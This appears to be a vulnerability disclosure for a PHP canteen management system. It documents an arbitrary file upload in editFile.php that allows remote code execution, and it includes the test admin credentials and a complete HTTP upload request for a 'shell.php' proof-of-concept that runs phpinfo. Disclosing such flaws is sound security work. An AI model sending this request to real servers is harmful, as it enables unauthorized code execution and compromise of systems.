# Canteen Management System v1.0 by mayuri_k has arbitrary code execution (RCE)

BUG_Author: Qianxin Niu

vendors: https://www.sourcecodester.com/php/15688/canteen-management-system-project-source-code-php.html

The program is built using the xmapp-php8.1 version

Login account: mayuri.infospace@gmail.com/rootadmin (Super Admin account)

Vulnerability url: ip/youthappam/php_action/editFile.php?id=1

Loophole location: Canteen Management System's editFile.php file exists arbitrary file upload (RCE)

Request package for file upload：‘

```sql
POST /youthappam/php_action/editFile.php?id=1 HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=lf9hph2449vgrcadcct2jgd8ne
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------88582622926272
Content-Length: 422

-----------------------------88582622926272
Content-Disposition: form-data; name="old_image"


-----------------------------88582622926272
Content-Disposition: form-data; name="productImage"; filename="shell.php"
Content-Type: application/octet-stream

<?php phpinfo(); ?>
-----------------------------88582622926272
Content-Disposition: form-data; name="btn"


-----------------------------88582622926272--
```

The files will be uploaded to this directory \youthappam\assets\myimages\

![image](https://user-images.githubusercontent.com/54017627/195259698-3fcd7282-3fd9-4a16-b3ac-e4260035f352.png)

We visited the directory of the file in the browser and found that the code had been executed

![image](https://user-images.githubusercontent.com/54017627/195259828-72982242-d8b7-4af2-b023-aea7b9a243fc.png)
